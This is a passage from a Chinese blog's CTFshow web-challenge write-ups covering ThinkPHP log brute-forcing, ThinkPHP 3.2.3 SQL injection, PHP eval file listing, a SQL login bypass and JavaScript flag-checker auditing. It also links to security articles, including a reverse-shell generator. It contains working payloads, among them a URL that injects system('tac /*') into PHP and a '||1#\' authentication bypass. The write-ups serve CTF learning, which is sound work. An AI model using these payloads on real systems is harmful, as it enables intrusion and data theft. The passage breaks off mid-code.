class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;index?n&#x3D;&lt;?php%20system(%27tac%20&#x2F;*%27);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>572</strong></p><p>ThinkPHP日志文件</p><p>题目中提到了爆破，在thinkphp开启debug的情况下会在Runtime目录下生成log文件，文件的名称是以<code>年_月_日.log</code>来命名的。所以我们可以来爆破文件名</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;xx_xx_xx.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206131917820.png"></p><p>扫出了这么个文件，发现似乎传参showctf可执行php代码，拿到flag</p><p><strong>573</strong></p><p><strong>ThinkPHP 3.2.3sql注入漏洞</strong></p><p>先写个可以调用内置sql查询的主页</p><pre class="line-numbers language-none"><code class="language-none">class IndexController extends Controller &#123;    public function index()&#123;    $a&#x3D;M(&#39;xxx&#39;);  &#x2F;&#x2F;表名    $id&#x3D;I(&#39;GET.id&#39;);    $b&#x3D;$a-&gt;find($id);    var_dump($b);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在I方法中对输入的内容进行过滤，默认过滤器<code>DEFAULT_FILTER</code>是不会对单引号做过滤操作的，所以此处不用管，下面走<code>think_filter</code>方法，这里对一些敏感安全内容进行了过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// TODO 其他安全过滤</span><span class="token comment">// 过滤查询特殊字符</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$value</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OK，输入检查完毕，我们输入的内容进入到<code>find</code>方法中，这里的注释也对我们传入的参数做了详细的解释，下一步进一步跟踪<code>_parseOptions</code>方法，继续跟踪<code>_parseType</code>方法，该方法对内容类型进行解析</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 查询数据 * @access public * @param mixed $options 表达式参数 * @return mixed */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(is_scalar($val)) &#123;    $this-&gt;_parseType($options[&#39;where&#39;],$key);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">elseif(false &#x3D;&#x3D;&#x3D; strpos($fieldType,&#39;bigint&#39;) &amp;&amp; false !&#x3D;&#x3D; strpos($fieldType,&#39;int&#39;)) &#123;                $data[$key]   &#x3D;  intval($data[$key]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>先放一个yu师傅的<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/miuzzx/article/details/119424071" >代码审计</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，以后再回来看</p><p><strong>574</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大佬文章合集</title>
      <link href="/posts/f85e0a9a.html"/>
      <url>/posts/f85e0a9a.html</url>
      
        <content type="html"><![CDATA[        <h3 id="CTF-PHP反序列化总结"   >          <a href="#CTF-PHP反序列化总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF-PHP反序列化总结" class="headerlink" title="[CTF]PHP反序列化总结"></a><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen" >[CTF]PHP反序列化总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="CTF-htaccess的使用技巧总结"   >          <a href="#CTF-htaccess的使用技巧总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF-htaccess的使用技巧总结" class="headerlink" title="[CTF].htaccess的使用技巧总结"></a><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/solitudi/article/details/116666720" >[CTF].htaccess的使用技巧总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="Web安全学习笔记"   >          <a href="#Web安全学习笔记" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web安全学习笔记" class="headerlink" title="Web安全学习笔记"></a><span class="exturl"><a class="exturl__link"   href="https://websec.readthedocs.io/zh/latest/index.html" >Web安全学习笔记</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="Java-Web安全"   >          <a href="#Java-Web安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Web安全" class="headerlink" title="Java Web安全"></a><span class="exturl"><a class="exturl__link"   href="https://javasec.org/" >Java Web安全</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="反弹shell命令生成器"   >          <a href="#反弹shell命令生成器" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell命令生成器" class="headerlink" title="反弹shell命令生成器"></a><span class="exturl"><a class="exturl__link"   href="https://www.revshells.com/" >反弹shell命令生成器</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="PHP中SESSION反序列化机制"   >          <a href="#PHP中SESSION反序列化机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP中SESSION反序列化机制" class="headerlink" title="PHP中SESSION反序列化机制"></a><span class="exturl"><a class="exturl__link"   href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" >PHP中SESSION反序列化机制</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="Java-Web入门"   >          <a href="#Java-Web入门" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Web入门" class="headerlink" title="Java Web入门"></a><span class="exturl"><a class="exturl__link"   href="https://www.bookstack.cn/read/Heart-First-JavaWeb/source-README.md" >Java Web入门</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>              <h3 id="从一个绕过长度限制的-XSS-中，我们能学到什么？"   >          <a href="#从一个绕过长度限制的-XSS-中，我们能学到什么？" class="heading-link"><i class="fas fa-link"></i></a><a href="#从一个绕过长度限制的-XSS-中，我们能学到什么？" class="headerlink" title="从一个绕过长度限制的 XSS 中，我们能学到什么？"></a><span class="exturl"><a class="exturl__link"   href="https://www.tr0y.wang/2020/08/18/IDN/" >从一个绕过长度限制的 XSS 中，我们能学到什么？</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow大赛原题</title>
      <link href="/posts/76fe6b8e.html"/>
      <url>/posts/76fe6b8e.html</url>
      
        <content type="html"><![CDATA[<p><strong>680</strong></p><p>post传入<code>code=phpinfo();</code>执行成功，查看被ban函数，无法执行命令，使用原生类查看文件</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;$a&#x3D;new FilesystemIterator(&quot;.&quot;);var_dump ($a);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090028188.png"></p><p>下载文件即可</p><p><strong>681</strong></p><p>抓包发现返回内容为sql语句</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090039242.png"></p><p>过滤了空格和引号，会被吞，尝试构造payload，发现#可用，\可用，构造语句<code>||1#\</code>此时执行语句为</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'||1#\' or nickname = '</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#\'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相当于判断username是否等于<code>||1&#39; or nickname = </code>这一字符串或一，结果永真，登录即可拿到flag</p><p><strong>682</strong></p><p>这辈子第一次碰到js代码审计，看呗</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">c2n</span>  <span class="token operator">=</span> <span class="token parameter">c</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0x60</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0x67</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x57</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> <span class="token function-variable function">s2n2su</span> <span class="token operator">=</span> <span class="token parameter">s</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>    r<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> s<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        r<span class="token operator">+=</span><span class="token function">c2n</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> r<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> m<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token string">'error'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> start <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">!==</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>length<span class="token punctuation">,</span>m<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> s <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> k <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">s2n2su</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token punctuation">(</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">'dda'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x1ae</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token punctuation">(</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha224</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">st3</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'GVSTMNDGGQ2DSOLBGUZA===='</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'you are right'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> Base64 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">_keyStr</span><span class="token operator">:</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span><span class="token punctuation">,</span>    <span class="token function-variable function">encode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>        <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        e <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_encode</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            n <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s <span class="token operator">=</span> n <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>            o <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> r <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>            u <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> i <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> i <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                u <span class="token operator">=</span> a <span class="token operator">=</span> <span class="token number">64</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                a <span class="token operator">=</span> <span class="token number">64</span>            <span class="token punctuation">&#125;</span>            t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">decode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> i<span class="token punctuation">;</span>        <span class="token keyword">var</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>        <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^A-Za-z0-9+/=]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            s <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            o <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            u <span class="token operator">=</span> <span class="token 